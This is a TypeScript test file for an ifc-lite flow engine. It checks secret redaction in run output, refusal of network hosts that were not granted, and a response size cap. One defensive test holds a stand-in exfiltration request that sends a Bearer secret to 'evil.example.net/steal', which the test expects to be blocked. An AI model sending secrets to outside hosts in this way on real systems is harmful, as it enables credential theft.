/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at https://mozilla.org/MPL/2.0/. */

/**
 * A secret must never leave the process in run output — including when a
 * remote server echoes it back (#5167 3.5).
 *
 * This runs the PRODUCTION path end to end: the real `http.request` node, the
 * real grant check against a granted `https` host, and a transport that plays
 * a misbehaving API reflecting the caller's `Authorization` header in its
 * error body. Only the transport is substituted — the allow-list check runs
 * before it is ever called — so nothing here goes around the gate.
 */

import { describe, expect, it } from 'vitest';
import { parseCapabilities } from '@ifc-lite/extensions';
import type { FlowDocument } from '@ifc-lite/flow';
import type { FetchTransport } from '@ifc-lite/sandbox';
import { createStandardRegistry, type FlowHost } from './index.js';
import { buildRedactionMap, interpolateSecrets, redactDeep, resolveSecretValues, validateSecretReferences } from './secrets.js';

function doc(overrides: Partial<FlowDocument>): FlowDocument {
  return { flowVersion: 1, id: 'g', name: 'g', capabilities: [], inputs: [], outputs: [], nodes: [], edges: [], ...overrides };
}

function grantsFor(capabilities: readonly string[]) {
  const parsed = parseCapabilities(capabilities);
  if (!parsed.ok) throw new Error(JSON.stringify(parsed.errors));
  return parsed.value;
}

const SECRET_VALUE = 'sekret-do-not-leak-9f8e7d6c5b4a';

/** A transport standing in for an API that reflects the Authorization header. */
function reflectingTransport(calls: string[]): FetchTransport {
  return async (url, init) => {
    calls.push(url.href);
    const auth = new Headers(init.headers).get('authorization');
    return new Response(JSON.stringify({ error: 'unauthorized', receivedAuthorization: auth }), {
      status: 401, headers: { 'content-type': 'application/json' },
    });
  };
}

async function runRequest(url: string, headers: Record<string, string>, host: FlowHost) {
  const node = createStandardRegistry().get('http.request');
  expect(node, 'http.request is registered').toBeDefined();
  return node!.run({ host, laneKey: null, log: () => undefined } as never, {}, { url, method: 'GET', headers }) as Promise<{ status: number; body: string }>;
}

describe('secret redaction — a reflected secret never leaks into run output', () => {
  it('redacts a secret the server echoed back, after a real grant-checked request', async () => {
    const graph = doc({
      capabilities: ['secret.read:API_TOKEN', 'network.fetch:api.example.com'],
      nodes: [{ id: 'req', type: 'http.request', params: { url: 'https://api.example.com/v1', headers: { Authorization: 'Bearer {{secret:API_TOKEN}}' } } }],
    });
    const env = { API_TOKEN: SECRET_VALUE };
    expect(validateSecretReferences(graph, env)).toEqual([]);

    const values = resolveSecretValues(graph, env);
    const runDoc = interpolateSecrets(graph, values);
    const params = runDoc.nodes[0].params as { url: string; headers: Record<string, string> };

    const calls: string[] = [];
    const response = await runRequest(params.url, params.headers, {
      bim: {} as never,
      networkGrants: grantsFor(graph.capabilities),
      networkTransport: reflectingTransport(calls),
    });
    expect(calls).toEqual(['https://api.example.com/v1']);
    // The leak vector is real before redaction runs.
    expect(response.body).toContain(SECRET_VALUE);

    const rawSummary = {
      ok: false,
      outputs: [{ label: 'response', key: 'req.body', data: response.body }],
      log: [{ nodeId: 'req', level: 'error', message: `http.request failed: server said ${response.body}` }],
    };
    const serialized = JSON.stringify(redactDeep(rawSummary, buildRedactionMap(values)));
    expect(serialized).not.toContain(SECRET_VALUE);
    expect(serialized).toContain('<secret:API_TOKEN>');
    expect(JSON.stringify(rawSummary), 'the fixture really carried it').toContain(SECRET_VALUE);
  });

  it('refuses a host the graph did not grant BEFORE the transport is called', async () => {
    const calls: string[] = [];
    await expect(runRequest('https://evil.example.net/steal', { Authorization: `Bearer ${SECRET_VALUE}` }, {
      bim: {} as never,
      networkGrants: grantsFor(['network.fetch:api.example.com']),
      networkTransport: reflectingTransport(calls),
    })).rejects.toThrow(/not covered by a granted network.fetch/);
    // The secret-bearing request never left: the transport saw nothing.
    expect(calls).toEqual([]);
  });

  it('refuses a secret too short to redact, naming the variable and never the value', () => {
    const graph = doc({
      capabilities: ['secret.read:PIN'],
      nodes: [{ id: 'req', type: 'http.request', params: { url: 'https://api.example.com/', headers: { 'X-Pin': '{{secret:PIN}}' } } }],
    });
    let message = '';
    try {
      resolveSecretValues(graph, { PIN: '4711' });
    } catch (error) {
      message = (error as Error).message;
    }
    expect(message).toMatch(/secret PIN is shorter than 6 characters/);
    expect(message).not.toContain('4711');
  });
});

describe('http.request — response cap (#5446 review)', () => {
  it('honours an explicit maxBytes of 0 instead of lifting it to the default', async () => {
    const calls: string[] = [];
    const node = createStandardRegistry().get('http.request')!;
    const response = await node.run(
      { host: { bim: {} as never, networkGrants: grantsFor(['network.fetch:api.example.com']), networkTransport: reflectingTransport(calls) }, laneKey: null, log: () => undefined } as never,
      {},
      { url: 'https://api.example.com/v1', method: 'GET', headers: {}, maxBytes: 0 },
    ) as { body: string; truncated: boolean };
    expect(calls).toEqual(['https://api.example.com/v1']);
    expect(response.body).toBe('');
    expect(response.truncated).toBe(true);
  });
});
